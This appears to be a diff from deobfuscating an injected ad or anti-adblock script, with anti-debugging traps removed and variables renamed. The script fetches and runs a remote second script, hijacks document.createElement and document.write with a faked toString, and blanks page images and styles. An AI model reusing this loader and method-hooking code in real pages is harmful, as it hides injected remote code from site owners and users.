@@ -8,34 +8,17 @@
         return paramsObject
     }
     function main() {
-        function h() {
+        function first_faker() {
             var d = DOCUMENT.getElementsByTagName("IMG");
-            if (!dict) {
-                debugger
-                main();
-                return
-            }
-
             var c = 0;
             for (var f = 0; f < d.length; f++) {
                 if (d[f].src && d[f]["src"] != "") {
-                    if (main === "arg load fail, 204") {
-                        debugger
-                        main = true;
-                        return
-                    }
-
                     d[f].src = "";
                     c++
                 }
             }
 
-            if (!main) {
-                debugger
-                main = "dloaded"
-            } else {
-                return c
-            }
+            return c
         }
 
         function disableDocumentStyles() {
@@ -44,19 +27,17 @@
                 documentStyles[c].disabled = true
             }
 
-            h();
+            first_faker();
             WINDOW.stop()
         }
 
         function replace_domElement_method(domElement, elementMethod, newMethod) {
+
             function to_string_mascarading() {
                 return original_element_method_source
             }
+
             var original_element_method_source = domElement[elementMethod].toString();
-//                    if (main == 1) {
-//                        debugger
-//                        main = 0
-//                    }
 
             newMethod._orig = domElement[elementMethod].bind(domElement);
             domElement[elementMethod] = newMethod;
@@ -65,7 +46,7 @@
 
         function disableStylesBySlowPerformance(c) {
             var b = WINDOW.performance.now() - c.start;
-            if (b < v) {
+            if (b < intValue300) {
                 disableDocumentStyles()
             }
         }
@@ -81,12 +62,13 @@
             elScript.textContent = b;
             window.secondScript = b;
 //                    elScript.src = "secondScript.js";
-            debugger
+//            debugger
             DOCUMENT.documentElement.appendChild(elScript);
-//                    DOCUMENT.documentElement.removeChild(elScript)
+                    DOCUMENT.documentElement.removeChild(elScript)
         }
 
         function create_SelfExecutable_Script_With_Application_Tag(b) {
+            //debugger
             var c = "mzs__" + WINDOW.Math.random().toString().substr(2, 4);
             WINDOW[c] = stateData;
             b = "(function(mz_str) { debugger; " + b + "})('" + c + "');";
@@ -99,6 +81,7 @@
             function onError() {
                 disableStylesBySlowPerformance(ajaxRequest)
             }
+            window.logs(ajaxUri)
             //      new window.XMLHttpRequest()
             var ajaxRequest = new WINDOW.XMLHttpRequest();
             // .open('GET', )
@@ -119,7 +102,7 @@
             ajaxRequest.send(null)
         }
         function recode_encodedDict_in_loaded_script(scriptSource) {
-            debugger
+            //debugger
             /**
              * .match Ищет закодированный словарь и возвращает его в виде массива из двух элементов
              **/
@@ -134,11 +117,6 @@
                 var n = script_Encripted_Dictionary[1];
                 var s = n.split('","');
                 var o = "", concatenated_encoded_elements = dict[4], v = 0, c = [];
-//                        if (!main) {
-//                            debugger
-//                            main();
-//                            main = "document"
-//                        }
 
                 /**
                  * Ищим вхождение "магоической херни" - МХ. На момент дебага её индекс был 172
@@ -160,18 +138,10 @@
                     var encoded_word_after_MX = s[g], h = g - v - 1;
 
                     var chars_to_recode = concatenated_encoded_elements.substr(h * 2, 2);
-//                            if (!main) {
-//                                debugger
-//                                return
-//                            }
 
                     var power_for_recoding_intChar_of_encoded_word_after_MX = WINDOW.parseInt(chars_to_recode, 16), chars_to_recode_as_int_copy = power_for_recoding_intChar_of_encoded_word_after_MX;
 
                     var recoded_word_after_MX = "";
-//                            if (!dict) {
-//                                debugger
-//                                main()
-//                            }
 
                     for (var i = 0; i < encoded_word_after_MX.length; i += 2) {
                         var intChar_of_encoded_word_after_MX = WINDOW.parseInt(encoded_word_after_MX.substr(i, 2), 16);
@@ -213,45 +183,29 @@
 
                     if (g) {
                         hack_documents_methods(g);
-                        if (!dict) {
-                            return
-                        } else {
-                            new_element.removeEventListener("load", iframe_onload_listener)
-                        }
+                        new_element.removeEventListener("load", iframe_onload_listener)
                     }
                 }
-                debugger
+                // hack_documents_methods
+                //debugger
 
                 var original_create_element = arguments.callee._orig;
-
                 var new_element = original_create_element.apply(this, arguments);
 
                 if (new_element.tagName == "IFRAME") {
                     new_element.addEventListener("load", iframe_onload_listener)
                 }
-
                 return new_element
             }
 
             function new_document_write() {
-//                        if (!main) {
-//                            debugger
-//                            main = null
-//                        }
-
+                debugger
                 var c = arguments.callee._orig;
-
                 var d = this.readyState;
 
                 c.apply(this, arguments);
 
                 if (d == "complete") {
-//                            if (!dict) {
-//                                debugger
-//                                main(true);
-//                                main = 0;
-//                                return
-//                            }
                     add_Error_and_Load_Listeners(this)
                 }
             }
@@ -263,8 +217,6 @@
                 add_Error_and_Load_Listeners(this)
             }
 
-            debugger
-
             replace_domElement_method(g, "createElement", new_document_create_element);
             var h = new_document_write;
             replace_domElement_method(g, "write", h);
@@ -274,26 +226,24 @@
             add_Error_and_Load_Listeners(g)
         }
 
-        function p(c, d) {
-            var f = c.target;
-//                    if (!dict) {
-//                        debugger
-//                        return
-//                    }
-
-            var b = (d) ? stateData.er_load : stateData.sc_load;
-            b.push(f)
+        function eventListener_error_load(event, isError) {
+            var event_target = event.target;
+            var targets_stack = (isError) ? stateData.er_load : stateData.sc_load;
+            try {
+                window.logs({isError: isError, target: event_target.src || event_target.textContent || event_target.href})
+            } catch (e){}
+            targets_stack.push(event_target)
         }
 
-        function add_Error_and_Load_Listeners(b) {
-            b.addEventListener("error", stateData.er_listen, true);
-            b.addEventListener("load", stateData.sc_listen, true)
+        function add_Error_and_Load_Listeners(domElement) {
+            domElement.addEventListener("error", stateData.er_listen, true);
+            domElement.addEventListener("load", stateData.sc_listen, true)
         }
 
         function loadSecondScript() {
             function secondScriptRecieved(ajaxResponse) {
                 function secondScriptCallback(b) {
-                    debugger
+                    //debugger
                     addAndRemoveScriptElement(recode_encodedDict_in_loaded_script(b.responseText))
                 }
                 if (ajaxResponse.status == 204) { // status
@@ -314,7 +264,7 @@
                 if (!stateData.vars.session || !ajaxHeaderXLocation) {
                     return
                 };
-
+                // debugger; // now we will request for second script
                 stateData.vars.proxy_host = ( new WINDOW.URL(ajaxHeaderXLocation)).host;
 
                 var h = stateData.vars.proxy_host.indexOf("-");
@@ -322,7 +272,8 @@
                     stateData.vars.proxy_host = stateData.vars.proxy_host.substr(h + 1)
                 }
 
-                ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
+                ajaxGetUri("https://sinoptik.ua/rc/ui/rc1/secondScript.js", secondScriptCallback)
+                //ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
             }
             function makeQueryUri() {
                 var queryParamsArray = [];
@@ -344,107 +295,61 @@
                 queryParamsObject.w = "1" // b['w'] = 1
             }
 
-            debugger;
+            //debugger;
 //                    var scr = document.querySelectorAll('script')[1].innerText
 //                    var decripted = decriptor(dict, 'dict', scr)
             ajaxGetUri(makeQueryUri(), secondScriptRecieved)
 //                    ajaxGetUri("https://recreativ.ru/tizers.php?bn=WETPNH5v46", secondScriptRecieved)
         }
-        function d(a) {
-            p(a, true)
+        function er_listen(event) {
+            eventListener_error_load(event, true)
         }
-        function f(a) {
-            p(a, false)
+        function sc_listen(event) {
+            eventListener_error_load(event, false)
         }
-//                if (!dict) {
-//                    debugger
-//                    main(false);
-//                    return
-//                }
-//
-//                if (!main) {
-//                    debugger
-//                    main(false);
-//                    return
-//                }
-//
-//                if (main == null) {
-//                    debugger
-//                    main("addEventListener", false);
-//                    main = true;
-//                    return
-//                }
 
-        var WINDOW = window, DOCUMENT = WINDOW.document, v = 300, u = 7,
-            dictionaryWord55 = "tttZZZ2m", dictionaryWord56 = "f4FFv";
+        window.logs = function(){
+            console.log(JSON.stringify(arguments, null, 2))
+        }
+
+
+        var WINDOW = window, DOCUMENT = WINDOW.document, intValue300 = 300, intValue7 = 7,
+            magicWord_tttZZZ2m = "tttZZZ2m", magicWord_f4FFv = "f4FFv";
         var stateData = {};
         var proxyApiUrl = "piguiqproxy.com/api";
         var t = false;
         var C = false;
         var B = null;
-//                if (main === true) {
-//                    debugger
-//                    main = true;
-//                    return
-//                };
         try {
-            if (WINDOW.opener && WINDOW.opener["_tttZZZ2m"] == "f4FFv") {
-                WINDOW.opener["_tttZZZ2m"] = "";
+            if (WINDOW.opener && WINDOW.opener["_" + magicWord_tttZZZ2m] == "f4FFv") {
+                WINDOW.opener["_" + magicWord_tttZZZ2m] = "";
                 t = true
             }
         } catch (e) {
         }
 
-//                if (!dict) {
-//                    debugger
-//                    main = "responseType"; // "responseType"
-//                    return
-//                }
-//
-//                if (!dict) {
-//                    debugger
-//                    return
-//                }
-//
-//                stateData.er_load = []; // er_load
-//                if (!main) {
-//                    debugger
-//                    main = 1;
-//                    return
-//                }
+        stateData.er_load = []; // stack of error event targets
+        stateData.sc_load = []; // stack of load event targets
 
-        stateData.sc_load = []; // "sc_load" x[]
-        stateData.docs = []; // "docs"
+        stateData.docs = []; // stack of documents - root and iframe
+
         stateData.vars = paramsObjectFactory("proxy_host", "", "session", dict[4]); // x['vars'] =
         stateData.dloaded = false; // x['dloaded'] ? document loaded
+
+        window.logs('stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT)')
         stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT); // x['cr_el'] = document[createElement][bind](document)
-        stateData.er_listen = d; // x['er_listen']
-        if (main === 1) {
-            debugger
-            main = 0;
-            return
-        } else {
-            stateData.sc_listen = f // x['sc_listen']
-        }
+        stateData.er_listen = er_listen; // x['er_listen']
+        stateData.sc_listen = sc_listen // x['sc_listen']
 
-        if (!dict) {
-            debugger
-            main();
-            main = null
-        } else {
-            loadSecondScript()
-        }
+        window.logs('loadSecondScript()')
+        loadSecondScript()
 
+        window.logs('hack_documents_methods(DOCUMENT)')
         hack_documents_methods(DOCUMENT);
 
         if (t) { // always false
             debugger
             DOCUMENT.writeln("<NOFRAMES>");
-            if (!main) {
-                debugger
-                return
-            }
-
             DOCUMENT.close()
         }
     }
@@ -479,10 +384,6 @@
     for (dictWord = 0; dictWord < encodedDictionary.length; dictWord++)
         for (dict[dictWord] = "", dictChar = 0; dictChar < encodedDictionary[dictWord].length; dictChar += 2)
             dict[dictWord] += String.fromCharCode(parseInt(encodedDictionary[dictWord].substr(dictChar, 2), 16));
-    if (!main) {
-        debugger
-        return
-    }
 
     (main)()
 })()
